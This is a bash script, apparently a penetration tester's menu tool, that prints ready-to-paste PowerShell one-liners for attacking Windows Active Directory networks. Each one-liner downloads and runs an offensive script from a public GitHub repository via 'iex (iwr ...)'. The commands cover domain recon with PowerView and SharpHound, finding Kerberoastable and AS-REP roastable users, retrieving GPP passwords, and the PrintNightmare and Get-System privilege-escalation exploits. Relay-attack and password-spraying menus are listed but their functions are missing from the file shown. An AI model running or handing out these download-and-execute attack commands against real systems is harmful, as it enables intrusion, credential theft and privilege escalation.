# Test

################################################################################
# Variables                                                                    #
################################################################################

LocalIP="10.10.14.10";		#
LocalPort="8080";		#
Username="Moe";			#
NQUsername="";			#
Password="Password";			#
Domain="security.local";			#
NQDomain="";			#
IP="10.10.10.10";				#
NQIP="";			#
LDAP="";			#
baseLDAP="";			#
DC="";				#
NS="IP";			#
Version="v2.1"			#
MainCheck="1"			#


################################################################################
# Colors                                                                       #
################################################################################

RESTORE='\033[0m'

RED='\033[00;31m'
GREEN='\033[00;32m'
YELLOW='\033[00;33m'
BLUE='\033[00;34m'
PURPLE='\033[00;35m'
CYAN='\033[00;36m'
LIGHTGRAY='\033[00;37m'

LRED='\033[01;31m'
LGREEN='\033[01;32m'
LYELLOW='\033[01;33m'
LBLUE='\033[01;34m'
LPURPLE='\033[01;35m'
LCYAN='\033[01;36m'
WHITE='\033[01;37m'

IBLUE='\033[02;34m'
ICYAN='\033[02;36m'

BloodHoundRepo="https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/";
EmpireRepo="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/";
GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/";
PowerSharpPack="https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/";
PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/";
S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
SecListsRepo="https://github.com/danielmiessler/SecLists/";

iwr="iex (iwr -usebasicparsing "
DownloadMethod="$iwr"



Internal_Menu_Main(){

	clear

echo -e ""
echo -e ""
echo -e ""
echo -ne " What would you like to do?



        1)  ->  [ Recon ]
        2)  ->  [ Privilege Escalation ]
        3)  ->  [ Relay Attacks ]
        4)  ->  [ Password Spraying ]
"
        read a
        case $a in
	        1) Internal_Menu_Recon ;;
	        2) Internal_Menu_Privilege_Escalation ;;
	        3) Internal_Menu_Relay_Attacks ;;
	        4) Internel_Menu_Password_Spraying ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}


Internal_Menu_Recon(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Recon Type



        1)  ->  [ Local Host Recon ]
        2)  ->  [ Domain Recon ]
        3)  ->  [ Network Recon ] 
        4)  ->  [ File and Share Recon ]
"
        read a
        case $a in
	        1) Internal_Menu_Recon_Local_Host ;;
	        2) Internal_Menu_Recon_Domain ;;
	        3) Internal_Menu_Recon_Network ;;
	        4) Internal_Menu_Recon_File_Share ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}



Internal_Menu_Recon_Local_Host(){

	clear

echo -e ""
echo -e ""
echo -e ""      
echo -e "${LGREEN}Local Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}HostRecon${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/HostRecon.ps1);Invoke-HostRecon"
echo -e ""
echo -e "${IBLUE}Invoke-Seatbelt${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=all"
echo -e ""
echo -e "${IBLUE}Invoke-WinEnum${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-WinEnum.ps1);Invoke-WinEnum"
echo -e ""
echo -e "${IBLUE}JAWS${RESTORE}"
echo -e "$DownloadMethod "$JAWSRepo"jaws-enum.ps1);JAWS-ENUM"
echo -e ""
echo -e ""

}

Internal_Menu_Recon_Domain(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Domain Recon Type



	1)  ->	[ Domain ACL's			]
	2)  -> 	[ Domain Controllers		]
        3)  ->  [ Domain Computers and Servers 	]
        4)  ->	[ Domain Forests 		]
        5)  ->	[ Domain GPO's			]
        6)  ->	[ Domain Groups			]
        7)  -> 	[ Domain Policies 		]
        8)  ->	[ Domain Trusts 		]
        9)  ->  [ Domain Users 			]
"
        read a
        case $a in
        	1) Internal_Menu_Recon_Domain_ACL ;;
        	2) Internal_Menu_Recon_Domain_Controllers ;;	
	        3) Internal_Menu_Recon_Domain_Computers_Servers ;;
	        4) Internal_Menu_Recon_Domain_Forests ;;
	        5) Internal_Menu_Recon_Domain_GPO ;;
	        6) Internal_Menu_Recon_Domain_Groups ;;
	        7) Internal_Menu_Recon_Domain_Policies ;;
	        8) Internal_Menu_Recon_Domain_Trusts ;;
	        9) Internal_Menu_Recon_Domain_Users ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}


Internal_Menu_Recon_Domain_ACL(){

	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${IBLUE}Search for interesting ACEs${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ACLScanner -ResolveGUIDs"
echo -e ""
echo -e "${IBLUE}Get ACLs for specific AD Object${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-ObjectACL -SamAccountName <SAM> -ResolveGUIDs"
echo -e ""
echo -e "${IBLUE}Get ACLs for specified prefix${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-ObjectACL -ADSprefix 'CN=Administrators,CN=Users' -Verbose"
echo -e ""
echo -e "${IBLUE}Get ACLs for specified prefix${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-PathACL -Path '\\\\\\\\Security.local\SYSVOL'"
echo -e ""
echo -e "" 

}


Internal_Menu_Recon_Domain_Controllers(){

	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Controller Enumeration${RESTORE}"
echo -e ""  
echo -e "${IBLUE}PowerView${RESTORE}" 
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetDomainController"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetDomain | Select-Object 'PdcRoleOwner'"
echo -e ""
echo -e ""

echo -ne  "Go Back?


        1)  ->  [ Domain Recon Menu ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}



Internal_Menu_Recon_Domain_Computers_Servers(){

	clear
 
echo -e ""
echo -e ""
echo -e ""   
echo -e "${LGREEN}Computer Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}All Computers${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Properties Name,OperatingSystem,distinguishedname | Sort Name "
echo -e ""
echo -e "${IBLUE}Ping Alive Computers${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Ping"
echo -e ""
echo -e "${IBLUE}Computers by Operating System${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows 10*'| Select Name,dnshostname,operatingsystem,operatingsystemversion "
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows 7*' | Select Name,dnshostname,operatingsystem,operatingsystemversion"  
echo -e ""
echo -e "${IBLUE}Servers by Operating System${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows Server*' | Select Name,dnshostname,operatingsystem,operatingsystemversion"
echo -e ""
echo -e ""

}

Internal_Menu_Recon_Domain_Forests(){

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get details about current Forest"
echo -e ""
echo -e "${IBLUE}Get all Domains in current Forest${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestDomain"
echo -e ""
echo -e "${IBLUE}Get global catalogs in current Forest${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestCatalog"
echo -e ""
echo -e "${IBLUE}Map Forest trusts${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestTrust"
echo -e ""
echo -e ""

}


Internal_Menu_Recon_Domain_GPO() {

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${IBLUE}Get GPO's in Domain${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO | Select DisplayName"
echo -e ""
echo -e "${IBLUE}Get GPO's applied to specific OU${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO -ADSpath ((Get-NetOU '<OU-Name>' -FullData).gplink.split(';')[0] -replace '^.')"
echo -e ""
echo -e ""

}

Internal_Menu_Recon_Domain_Groups() {

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${IBLUE}List all Groups${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup"
echo -e ""
echo -e "${IBLUE}List all Groups with partial wilcard${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup "\"*admin*"\""
echo -e ""
echo -e "${IBLUE}Identify interesting groups on a Domain Controller${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup Get-NetDomainController | Get-NetLocalGroup -Recurse"
echo -e ""
echo -e "${IBLUE}List Groups of which a user is a member of${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup Get-NetLocalGroup -Username '<Username>'"
echo -e ""
echo -e ""

}


Internal_Menu_Recon_Domain_Policies() {

	clear
 
echo -e ""
echo -e ""
echo -e ""   
echo -e "${IBLUE}Password Policy${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);(Get-DomainPolicy).'SystemAccess'"
echo -e ""
echo -e "${IBLUE}Kerberos Policy${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);(Get-DomainPolicy).'KerberosPolicy'"
echo -e ""
echo -e ""

}


Internal_Menu_Recon_Domain_Trusts() {

	clear
 
echo -e ""
echo -e ""
echo -e ""   
echo -e "${IBLUE}Get all Domains in Forest then list each Domain trust${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestDomain -Verbose | Get-NetDomainTrust"
echo -e ""
echo -e "${IBLUE}Map all reachable Domain trusts${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrusts"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrusts -LDAP"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrust | Select SourceDomain,TargetDomain,TrustType,TrustDirection"
echo -e ""
echo -e "${IBLUE}List external trusts${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}"
echo -e ""
echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetDomainTrust"
echo -e ""
echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Find-ForeignUser"
echo -e ""
echo -e ""

}


Internal_Menu_Recon_Domain_Users(){

	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${IBLUE}User Properties${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Properties Name,SamAccountName,Description | Sort Name"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Properties SamAccountName,Description | Sort SamAccountName"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Properties Name,Description,pwdlastset,badpwdcount | Sort Name"
echo -e ""
echo -e "${IBLUE}Specific user account${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Username '<Username>'"
echo -e ""
echo -e "${IBLUE}Search for string in User Description field${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Find-UserField -SearchField Description -SearchTerm 'built'"
echo -e ""
echo -e "${IBLUE}Kerberoastable Users${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -SPN | Select name,ServicePrincipalName | Sort Name"
echo -e ""
echo -e "${IBLUE}AS-REP Roastable Users${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -PreauthNotRequired | Select Name | Sort Name"
echo -e ""
echo -e ""

}


Internal_Menu_Recon_Network(){

   	 clear

echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Network Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-ARPScan${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-ARPScan.ps1);Invoke-ARPScan -CIDR '<CIDR>'"
echo -e ""
echo -e "${IBLUE}Invoke-PortScan${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR> or <IP>' -TopPorts 50 -Open -GrepOut Scan.txt"
echo -e ""
echo -e "${IBLUE}Invoke-Bloodhound${RESTORE}"
echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All"
echo -e ""
echo -e ""

}


Internal_Menu_Recon_File_Share() {

    clear
    
echo -e ""
echo -e ""
echo -e "" 
echo -e "${IBLUE}Share Enumeration${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ShareFinder -verbose"
echo -e ""
echo -e "${IBLUE}File Enumeration${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -verbose"
echo -e ""
echo -e ""

}

Internal_Menu_Privilege_Escalation() {

    clear

echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Privilege Escalation Type



        1)  ->  [ Checks ]
        2)  ->  [ Exploits ]
"
        read a
        case $a in
	        1) Internal_Menu_Privilege_Escalation_Checks ;;
	        2) Internal_Menu_Privilege_Escalation_Exploits ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}

Internal_Menu_Privilege_Escalation_Checks(){

    clear
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Tools${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-WinPEAS${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-winPEAS.ps1);Invoke-WinPEAS"
echo -e ""
echo -e "${IBLUE}PowerUp${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PowerUp.ps1);Invoke-AllChecks"
echo -e ""
echo -e "${IBLUE}Get-GPPPassword${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-GPPPassword.ps1);Get-GPPPassword"
echo -e ""
echo -e "${IBLUE}Sherlock${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Sherlock.ps1);Find-AllVulns"
echo -e ""
echo -e "${IBLUE}PrivescCheck${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PrivescCheck.ps1);Invoke-PrivescCheck"
echo -e ""
echo -e ""

}

Internal_Menu_Privilege_Escalation_Exploits(){

    clear
echo -e ""
echo -e ""
echo -e ""
echo -e "${IBLUE}Invoke-Printnightmare${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-Printnightmare.ps1);Invoke-Nightmare"
echo -e ""
echo -e "${IBLUE}Get-System${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-System.ps1);Get-System"
echo -e ""
echo -e ""   
  
}





Main_Menu(){

    clear

echo -ne "
            Main Menu

        1) -> Internal
        2) -> External (WIP)
"
        read a
        case $a in
	        1) Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}

# Call the menu function
Main_Menu
